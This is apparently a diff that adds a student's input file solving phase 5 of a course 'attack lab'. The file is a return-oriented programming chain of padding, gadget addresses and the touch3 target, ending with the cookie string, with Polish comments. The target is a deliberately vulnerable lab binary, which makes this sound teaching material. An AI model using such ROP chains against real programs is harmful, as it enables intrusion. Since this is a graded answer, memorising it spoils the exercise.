@@ -1,0 +1,15 @@
+/* padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+b6 1e 40 00 00 00 00 00 /* movq %rsp,%rax (48 89 e0) | 401eb5 + 1 = 401EB6 */
+cd 1d 40 00 00 00 00 00 /* movq %rax,%rdi (48 89 c7) | 401dcb + 2 = 401DCD */
+c2 1d 40 00 00 00 00 00 /* popq %rax (58) | 401dbf + 3 = 401DC2 */
+48 00 00 00 00 00 00 00 /* offset 72 */
+8f 1e 40 00 00 00 00 00 /* movl %eax,%edx (89 c2) | 401e8d + 2 = 401E8F */
+7a 1e 40 00 00 00 00 00 /* movl %edx,%ecx (89 d1) | 401e78 + 2 = 401E7A */
+06 1e 40 00 00 00 00 00 /* movl %ecx,%esi (89 ce) | 401e05 + 1 = 401E06 */
+ec 1d 40 00 00 00 00 00 /* %rdi + %rsi (add_xy) | 401DEC */
+cd 1d 40 00 00 00 00 00 /* movq %rax,%rdi (48 89 c7) | 401dcb + 2 = 401DCD */
+1e 1d 40 00 00 00 00 00 /* touch3 adres */
+36 31 36 63 35 63 33 64 00 /* ciasteczko zmienione przy pomocy man ascii */
